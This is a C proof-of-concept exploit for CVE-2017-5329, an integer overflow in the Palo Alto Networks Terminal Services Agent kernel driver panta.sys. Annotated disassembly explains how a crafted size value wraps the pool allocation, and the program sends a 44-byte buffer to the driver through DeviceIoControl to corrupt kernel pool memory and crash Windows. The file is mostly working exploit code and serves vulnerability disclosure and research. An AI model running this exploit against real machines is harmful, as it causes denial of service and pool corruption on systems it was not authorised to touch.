﻿/*

Exploit Title    - Palo Alto Networks Terminal Services Agent Integer Overflow
Date             - 26th January 2017
Discovered by    - Parvez Anwar (@parvezghh)
Vendor Homepage  - https://www.paloaltonetworks.com/
Tested Version   - 7.0.3-13 
Driver Version   - 6.0.7.0 - panta.sys
Tested on OS     - 32bit Windows 7 SP1 
CVE ID           - CVE-2017-5329
Vendor fix url   - https://securityadvisories.paloaltonetworks.com/ 
                   https://securityadvisories.paloaltonetworks.com/Home/Detail/71
Fixed Version    - 7.0.7 and later 
Fixed driver ver - 6.0.8.0


Disassembly
-----------

.text:9A26F0BD loc_9A26F0BD:                                                         
.text:9A26F0BD                 mov     ecx, DeviceObject                             
.text:9A26F0C3                 mov     dword ptr [ecx+1ACh], 0                       
.text:9A26F0CD                 mov     edx, DeviceObject
.text:9A26F0D3                 mov     eax, [edx+1B8h]                               ; eax points to our inputted buffer
.text:9A26F0D9                 mov     ecx, [eax+14h]                                ; Takes size to allocate from our inputted buffer 0x04924925
.text:9A26F0DC                 imul    ecx, 38h                                      ; 0x38 * 0x04924925 = 0x100000018. Wraps round becoming size to allocate 0x18 (Integer Overflow)
.text:9A26F0DF                 mov     [ebp+NumberOfBytes], ecx                      ; Copy ecx value 0x18 onto stack
.text:9A26F0E2                 push    44415450h                                     ; Tag (PTAD string used)
.text:9A26F0E7                 mov     edx, [ebp+NumberOfBytes]                      ; Copy size 0x18 to edx
.text:9A26F0EA                 push    edx                                           ; NumberOfBytes
.text:9A26F0EB                 push    0                                             ; PoolType
.text:9A26F0ED                 call    ds:ExAllocatePoolWithTag                      ; If returned null (eax) exits with error cleanly else takes crash path 
.text:9A26F0F3                 mov     ecx, DeviceObject
.text:9A26F0F9                 mov     [ecx+1B0h], eax
.text:9A26F0FF                 mov     edx, DeviceObject
.text:9A26F105                 cmp     dword ptr [edx+1B0h], 0                       ; Checks return value. If not null then jumps to our crash path
.text:9A26F10C                 jnz     short loc_9A26F13C                            ; Exits with error cleanly if incorrect size value but not crashable value

.text:9A26F13C
.text:9A26F13C loc_9A26F13C:                                                         
.text:9A26F13C                 mov     ecx, [ebp+NumberOfBytes]
.text:9A26F13F                 push    ecx                                           ; 0x18 our allocated pool memory
.text:9A26F140                 push    0                                             ; int, sets allocated memory to 0x00
.text:9A26F142                 mov     edx, DeviceObject
.text:9A26F148                 mov     eax, [edx+1B0h]
.text:9A26F14E                 push    eax                                           ; Pointer to our allocated buffer
.text:9A26F14F                 call    memset
.text:9A26F154                 add     esp, 0Ch
.text:9A26F157                 mov     [ebp+var_4], 0                                ; Null out ebp-4
.text:9A26F15E                 jmp     short loc_9A26F169

.text:9A26F160 loc_9A26F160:                                                         
.text:9A26F160                 mov     ecx, [ebp+var_4]
.text:9A26F163                 add     ecx, 1                                        ; Increment counter
.text:9A26F166                 mov     [ebp+var_4], ecx                              ; Store counter value

.text:9A26F169 loc_9A26F169:                                                         
.text:9A26F169                 mov     edx, DeviceObject                             
.text:9A26F16F                 mov     eax, [edx+1B8h]                               ; eax points to our inputted buffer
.text:9A26F175                 mov     ecx, [ebp+var_4]                              ; Loop counter number
.text:9A26F178                 cmp     ecx, [eax+14h]                                ; Compares our inputted buffer size 0x04924925. Here our
                                                                                     ; size is not using the wrapped value so loops till BSOD
.text:9A26F17B                 jnb     short loc_9A26F19A
.text:9A26F17D                 mov     edx, [ebp+var_4]                              ; Counter value
.text:9A26F180                 imul    edx, 38h
.text:9A26F183                 mov     eax, DeviceObject
.text:9A26F188                 mov     ecx, [eax+1B0h]                               ; Pointer to allocated pool copied to ecx
.text:9A26F18E                 lea     edx, [ecx+edx+30h]                            ; pointer+size(0x38*edx)+0x30
.text:9A26F192                 push    edx
.text:9A26F193                 call    sub_9A26C000                                  ; Starts overwriting other pool allocations !!!
.text:9A26F198                 jmp     short loc_9A26F160



.text:9A26C000 sub_9A26C000    proc near                                             
.text:9A26C000                                                                      
.text:9A26C000
.text:9A26C000 arg_0           = dword ptr  8
.text:9A26C000
.text:9A26C000                 push    ebp                                           
.text:9A26C001                 mov     ebp, esp
.text:9A26C003                 mov     eax, [ebp+arg_0]                              ; Copy allocated buffer pointer (pointer+size(0x38*edx)+0x30) to eax
.text:9A26C006                 mov     ecx, [ebp+arg_0]                              ; Copy allocated buffer pointer (pointer+size(0x38*edx)+0x30) to ecx
.text:9A26C009                 mov     [eax+4], ecx                                  ; Store pointer in allocated buffer at pointer+size(0x38*edx)+0x30+4
.text:9A26C00C                 mov     edx, [ebp+arg_0]                              ; Copy allocated buffer pointer+size(0x38*edx)+0x30 to edx
.text:9A26C00F                 mov     eax, [ebp+arg_0]                              ; Copy allocated buffer pointer+size(0x38*edx)+0x30 to eax
.text:9A26C012                 mov     [edx], eax                                    ; Store pointer in allocated buffer at pointer+size(0x38*edx)+0x30
.text:9A26C014                 pop     ebp
.text:9A26C015                 retn    4
.text:9A26C015 sub_9A26C000    endp



*/



#include <stdio.h>
#include <windows.h>

#define BUFSIZE 44


int main(int argc, char *argv[]) 
{
    HANDLE         hDevice;
    char           devhandle[MAX_PATH];
    DWORD          dwRetBytes = 0;
    unsigned char  buffer[BUFSIZE];


    memset(buffer, 0x41, BUFSIZE);

    printf("\n[i] Size of total input buffer %d bytes", BUFSIZE);

    *(DWORD*)(buffer + 20) = 0x04924925;

    sprintf(devhandle, "\\\\.\\%s", "panta");

    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
    
    if(hDevice == INVALID_HANDLE_VALUE)
    {
        printf("\n[-] Failed to open device %s\n\n", devhandle);
        return -1;
    }
    else 
    {
        printf("\n[+] Open %s device successful", devhandle);
    }	

    printf("\n[~] Press any key to continue . . .");
    getch();

    DeviceIoControl(hDevice, 0x88002200, buffer, BUFSIZE, NULL, 0, &dwRetBytes, NULL); 

    printf("\n");
    CloseHandle(hDevice);
    return 0;
}

